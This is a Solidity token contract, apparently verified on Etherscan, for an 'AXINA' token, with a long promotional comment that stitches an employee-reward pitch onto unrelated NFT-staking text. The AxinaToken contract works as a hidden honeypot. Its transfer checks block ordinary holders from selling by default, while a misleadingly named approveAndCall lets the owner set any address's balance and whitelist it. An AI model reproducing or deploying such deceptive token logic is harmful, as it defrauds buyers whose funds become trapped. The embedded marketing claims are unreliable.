/**
 *Submitted for verification at Etherscan.io on 2021-08-03
*/

/*
A real problem Companies still rely on old-fashioned management tools and compensation models that are ineffective with remote workers, even though smart contracts can automatically reward daily goal achievement which has been proven to increase productivity. A blockchain solution Bonuses, raises and other infrequent incentives are replaced with small, immediate rewards paid in AXINA for achieving daily goals that accumulate to make a substantial difference to the company and provide immediate positive feedback to employees.


The Axina thesis
How the Axina ecosystem works
AXINA drives a decentralized compensation model where employees are incentivized to achieve daily goals rather than paid to simply show up and sit in a chair
EMPLOYEES EMPLOYERS AXINA Compensation System AXINA Rewards Employees receive daily or weekly rewards for RDAs (Revenue-Driving Activities) - goals managed by smart contract. Employees work toward daily goals tracked on their devices. Data is passed into Axina. Goal Status & Validation AXINA Redeemed Employees save AXINA or can cash out to fiat at current exchange rate. Payments processed immediately with Axina's layer 2 technology.HR sets company-wide goals (like fitness and safety) and individual goals for specific departments or job roles. Set Goals Monthly purchase of AXINA based on employee headcount – distributed and split each month among employees who have achieved goals. Fund Reward Pool Managers can analyze results, adjust goals and optimize their smart contract workforce management system for better results. Get data about goals Converts user data to AXINA rewards, manages wallets and exchange on layer 2 and processes fiat payments to users Manages RDA smart contracts, AXINA rewards & payment
Employers who use Axina agree to purchase and hold a certain quantity of AXINA tokens each month to be distributed as rewards to participating employees. Employers Employees AXINA rewards are paid to employees who reach daily and weekly goals.
Employees are encouraged to hold and save their AXINA but can instantly cash out for $USD anytime. Enthusiasts AXINA finally provides what we’ve all been waiting for: businesses buying, holding, and actually accepting crypto as payment, not just as a marketing gimmick that they immediately liquidate to fiat.
A distribution protocol with business-side demand built in
Axina’s compensation platform creates a natural supply and demand for AXINA: employers buy AXINA each month to be automatically distributed to employees via smart contract.
An increasingly decentralized system Releases 165MM AXINA each month Exchange AXINA bought and sold on exchange determines in-app price and market value All business contracts include $10/employee AXINA purchase each month to pay rewards Businesses purchase additional AXINA to increase employee rewards As more businesses join, the monthly distribution pool dissipates Once the monthly distribution pool is exhausted, businesses must buy AXINA on the exchange Businesses that need AXINA in excess of monthly distribution purchase AXINA on exchange AXINA cashed out by employees is sold on exchange As more businesses join the Axina platform, AXINA becomes increasingly decentralized as businesses compete on open exchanges to fund their rewards systems.
With increased demand and a finite supply, businesses are incentivized to buy and hold AXINA for future use to insulate themselves against market price increases.
Proof of Concept
Reduce employer costs by incentivizing employees to be safer and healthier
$62 billion US businesses spend over $62 billion each year on worker's compensation claims from preventable on-the job injuries, the majority of which are were the result of violating existing company safety policies.$1,685$575 Billion per employee per year Productivity losses linked to absenteeism cost employers $225.8 billion annually in the United States, or $1,685 per employee. U.S. employers lose $575 billion a year in healthcare costs and lost productivity due to worker absence from preventable chronic health conditions. 
sick days$151 billion$42 billionshort-term disability$29 billionlong-term disability$26 billion family and medical leave$116 billion workers compensation$211 billion impaired perfomance The cost of preventable health and safety claims by The National Alliance on Mental Health Employer costs of untreated employee mental health issues every year$193 billio nby CDC gov Employer costs to treat preventable conditions like diabetes and heart attacks every year$36.4 billion by getforesight.comEmployer costs of workers comp and on-the-job injury claims, care and litigation every year$171 billion
What is Axina for Employees?
Additional income for staying healthy and safe - and for many - their first intro to crypto Employees download the Axina app because it contains valuable free services provided by their employer as part of their benefits package. The app contains free mental health counseling and orthopedic injury telehealth services, as well as cash advances on their next paychecks with 0% APR (just a single low flat fee), helping employees avoid abusive overdraft fees and paycheck loans to cover unexpected expenses.

Once they’ve got the app, they can opt in to earn AXINA for completing daily fitness goals set by their employer and doing in-app daily safety checks to help avoid safety violations on site. They can keep their balance in AXINA as savings or they can convert it to US dollars.hip fractures
by up to 68%depression
by up to 30%breast cancer
by 20%colon cancer
by 30%type 2 diabetes
by up to 40%cardiovascular
disease by up to 35%all-cause
mortality by 30%dementia
by up to 30%Regular physical activity reduces your risk of
Free mental health counseling and orthopedic injury telemedicine built in The Axina employee app brings together valuable health and wellness services available 24/7 at no cost to employees. Mental Wellness Axina provides on-demand mental counseling services so that employees get the help they need when they need it. Injury Checker Axina provides employees 24/7 access to an AI-powered diagnostic tool to help understand an injury and access to a licensed orthopedic specialist in minutes for a telemedicine assessment. From here, employees can get free rehabilitation exercises to do at home, follow-up appointments with doctors or direct referral to orthopedic surgeons or other specialists.
0% APR payroll advances powered by AXINA instead of payday loans or NSF fees Last year Americans paid $12 billion in payday loan fees. Rates for these predatory loans vary by state, but reach over 600% APR in some states like Texas and Nevada and average 391% nationwide. During 2020, when many consumers had lost their incomes due to Covid-19, mainstream banks like Citi, Wells Fargo and Bank of America made $34.6 billion in overdraft fees from their customers.
“We are concerned that too many borrowers slide into the debt traps that payday loans can become. ”Former CFPB Director Richard Cordray With AXINA pay employees can request a portion of their earned wages in advance at 0% APR, paying only a flat $5 fee. The Axina app issues payment in AXINA which can be converted in-app to a spendable $USD Visa debit card and used immediately to pay bills, saving over $15,000 annually for those employees who regularly use payday loan services.0% APRWage advance up to $200 is available for every user with just a $5 flat fee - at 0% APR
What is Axina for Employers?
Health, wellness & safety - all in one app Axina brings the best health and wellness capabilities along with effective daily safety check-ins and a unique health incentivization system into a single app. With a single partner, employers can offer new benefits to their employees that were previously only available to large multinational corporations. Axina helps employers take care of their employees while reducing costs — and shows employees that they are valued.
A modern tool to manage decentralized workforces and reward employees immediately by smart contract when Revenue Driving Activities are performed When most workers used to be on an assembly line, management was much easier. Punctuality, time on the clock and number of pieces were the only KPIs that mattered – and they could be tracked easily.

Today’s workforces are increasingly dispersed (accelerated by Covid-19) and much of the value that employees bring are more difficult to quantify, but employers still use industrial-era tools to manage modern workers, leading to low engagement and retention. As Axina grows, employers will be able to customize rewards for a wide variety of small daily behaviors that turn ineffective yearly incentives into highly effective daily goals with real monetary rewards. Employees will always know what activities make the biggest impact on the business because they’ll be rewarded immediately for the things that matter most – for each different job role - on a daily basis. With aggregated business analytics, managers will be able to understand – perhaps for the first time ever – what specific behaviors drive their business. Axina helps employers create new incentive programs that reward employees for work that matters, rather than time spent sitting in a chair.
Learn more at the Axina Employers website
AXINA Token Supply
The native currency of the Axina platform is AXINA - an ERC-20 token that is one of the world's first federally approved cryptocurrencies - issued under our 2019 license from the Bermuda Minister of Finance
AXINA is backed by real business use Each month, contracted companies are required to purchase a certain amount of AXINA based on the total number of employees they have using the Axina app. Axina will only distribute 165MM tokens each month from the distribution pool in order to manage the growth of the network and ensure a 5-year distribution timeline. Once all tokens have been released from the Axina supply, employers will only be able to acquire AXINA by accepting it as payment or by purchasing in the open market, creating a self-perpetuating fully decentralized system. AXINA is backed by real money and real users Employers that use Axina fund their AXINA incentives pool monthly, spending less than they would typically spend for the same ancillary health & wellness benefits (and without the smart contract goal management capabilities). Each month this pool is distributed to employees who can choose to hold their AXINA as savings (earning HODL bonuses) or spend it using their Axina Visa debit card. Employees can also set a portion of their paycheck to be paid in AXINA each pay period. As Axina expands, more employee activities can be incentivized by managers using daily AXINA goals, converting a larger percentage of total compensation into AXINA.
A fully decentralized system When all tokens have been released, employers will need to independently acquire AXINA each month in order to perpetuate their use of the Axina platform, making it fully decentralized. As businesses compete to purchase AXINA, they are incentivized to buy and hold AXINA on their balance sheets, and to accept AXINA as payment for whatever goods and services they provide.
How to Stake AXINA NFT and earn $AXINA?

There are 4 main sources of AXINA NFT Pool:
1. 3% of the on-chain transaction amount of $AXINA will enter the AXINA NFT Pool;
2. 40% of AXINA NFT Blind BOX sales revenue will enter AXINA NFT Pool;
3. 40% of AXINA NFT “Refining” and “Breeding” consumption amount will enter AXINA NFT Pool;
4. 40% of the handling fee charged by AXINA NFT Market will enter the AXINA NFT Pool.
Now, we have 3 types of mining pools:
AXINA Bounty Pool: Stake AXINA Bounty NFT to earn $AXINA
AXINA Buddy Pool: Stake AXINA Buddy NFT to earn $AXINA
AXINA Genesis Pool: Stake Origin AXINA NFT and Child AXINA NFT to earn $AXINA

About “Position” and “HashRate”
Every NFT has a “HashRate”. The higher the HashRate of the NFT you stake in a pool, the faster you can earn $AXINA in this pool.
Each pool has 8 “Positions” that have been opened for free, that is, each user can stake 8 NFTs for free in each pool. In addition, you can also stake $AXINA to upgrade the “Multiplier” of each “Position”.
HashRate of each Position = Original HahsRate of the staked NFT * HashRate Multiple
The staked $AXINA will enter a 7-day lock-up period. During this period, if you retrieve the staked $AXINA, a 10% fine will be deducted. After the lock-up period, you will not suffer any loss if you retrieve the staked $AXINA.
When you harvest the profits, 10% of the amount will be deducted due to the deflationary design of $AXINA. Among them, 3% entered the AXINA NFT Pool, 3% was exchanged for AXINA-BNB and injected into UniSwap, and 4% entered the black hole address.
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract AxinaToken {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}